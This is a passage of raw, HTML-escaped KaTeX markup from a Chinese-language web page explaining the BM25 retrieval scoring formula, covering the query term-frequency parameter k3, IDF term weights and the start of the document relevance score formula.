style=&#34;height:0.286108em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;表示单词在query中的词频，&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;k_3&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.84444em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;是一个可调正参数，来矫正query中的词频范围。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;每个单词的权重：&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;W&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;W_i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.83333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;W&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;表示分词权重，这里用IDF代替：&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;I&lt;/mi&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mi&gt;F&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mi&gt;N&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;0.5&lt;/mn&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;0.5&lt;/mn&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;IDF(q_i)=log(\frac{N-df_i+0.5}{df_i+0.5})&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.07847em;&#34;&gt;I&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;F&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.4133239999999998em;vertical-align:-0.481108em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.9322159999999999em;&#34;&gt;&lt;span style=&#34;top:-2.6550000000000002em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.3280857142857143em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:-0.10764em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.446108em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.10903em;&#34;&gt;N&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.3280857142857143em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:-0.10764em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.481108em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;N&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;N&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10903em;&#34;&gt;N&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;表示索引中全部文档数量，&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;df_i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8888799999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;表示包含了分词&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;q_i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;的文档个数。根据IDF的作用，对于&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;q_i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;来说，包含&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;q_i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;的文档数量越多，说明&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;q_i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;的重要性越小，或者区分度越低，所以用IDF来刻画&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;q_i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;与文档的相似度。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;R&lt;/mi&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;V&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;munder&gt;&lt;mo&gt;∑&lt;/mo&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo&gt;∈&lt;/mo&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;/mrow&gt;&lt;/munder&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mfrac&gt;&lt;mi&gt;N&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mfrac&gt;&lt;msub&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;/msub&gt;&lt;msub&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;v&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mfrac&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mrow&gt